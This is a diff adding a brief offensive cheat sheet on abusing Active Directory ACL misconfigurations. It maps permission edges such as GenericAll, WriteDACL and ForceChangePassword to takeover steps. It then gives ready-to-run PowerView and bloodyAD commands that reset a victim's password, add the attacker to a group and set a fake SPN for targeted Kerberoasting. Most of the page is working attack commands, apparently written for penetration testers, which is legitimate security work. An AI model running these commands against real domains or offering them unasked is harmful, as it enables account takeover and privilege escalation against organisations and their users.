@@ -1,0 +1,29 @@
+---
+title: "ACL Abuse"
+---
+
+Misconfigured object permissions let one principal take over another. BloodHound surfaces these edges; abuse them with PowerView or bloodyAD.
+
+```text
+GenericAll / GenericWrite  -> reset password, set SPN (targeted kerberoast), or write attributes
+WriteDACL                  -> grant yourself more rights on the object
+ForceChangePassword        -> reset a user's password without knowing the old one
+AddMember                  -> add yourself to a group (e.g. a nested path to Domain Admins)
+WriteOwner                 -> make yourself owner, then WriteDACL
+```
+
+```powershell
+# Reset a password you have ForceChangePassword over
+$p = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
+Set-DomainUserPassword -Identity victim -AccountPassword $p
+# Add self to a group you have AddMember over
+Add-DomainGroupMember -Identity 'Helpdesk' -Members me
+# Targeted Kerberoast via GenericWrite (set an SPN, roast, clear it)
+Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/svc'}
+```
+
+```bash
+# Linux equivalents
+bloodyAD -u USER -p PASS -d $DOMAIN --host $DC set password victim 'NewPass123!'
+bloodyAD -u USER -p PASS -d $DOMAIN --host $DC add groupMember 'Helpdesk' me
+```
